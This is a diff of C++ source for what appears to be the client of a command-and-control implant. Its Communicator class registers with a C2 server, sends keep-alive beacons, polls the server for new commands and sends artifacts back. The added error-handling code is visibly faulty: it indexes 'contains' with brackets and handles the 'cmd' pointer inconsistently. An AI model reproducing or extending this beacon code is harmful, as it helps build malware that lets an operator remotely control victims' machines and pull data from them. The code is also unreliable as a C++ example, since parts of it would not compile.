@@ -98,9 +98,9 @@ private:
         return resp_code == 200;
     }
     
-    void keep_alive()
+    bool keep_alive()
     {
-        send_request_safe(KEEP_ALIVE_URI, NULL, NULL);
+        return send_request_safe(KEEP_ALIVE_URI, NULL, NULL);
     }
 
     Communicator() {
@@ -145,7 +145,19 @@ public:
         We send on payload to the server in this case. 
         We only expect a response payload from the server. 
         */
-        return send_request_safe(CHECK_NEW_CMD_URI, NULL, cmd);
+        bool res = send_request_safe(CHECK_NEW_CMD_URI, NULL, &cmd);
+        json cmd_current = *cmd;
+        if (res)
+        {
+            if(cmd_current.contains["status"] && cmd_current["status"] == "error")
+            {
+                std::cout << "Failed fetching new command: " << cmd_current["message"] << std::endl;
+                return false;
+            }
+            return true;
+        }
+        std::cout << "Failed fetching new command due to server error" << std::endl;
+        return false;
     }
 
     bool c2_registration()
@@ -154,7 +166,7 @@ public:
         json registration_payload;
         registration_payload["client_id"] = client_id;
 
-        return send_request_safe(REGISTER_URI, registration_payload, &response) && response.contains("status") && response["status"] == "ok";
+        return send_request_safe(REGISTER_URI, registration_payload, &response) && response.contains("status") && response["status"] == "0";
     }
 
     void send_artifact(json payload)
